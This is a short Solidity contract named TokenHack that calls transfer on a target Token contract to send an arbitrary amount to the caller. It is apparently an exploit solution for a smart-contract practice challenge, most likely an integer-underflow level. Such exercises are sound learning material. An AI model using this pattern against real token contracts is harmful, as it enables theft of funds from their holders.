// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./Token.sol";

contract TokenHack {
    address target;

    constructor(address _target) {
        target = _target;
    }

    function hack(uint _value) external {
        Token(target).transfer(msg.sender, _value);
    }
}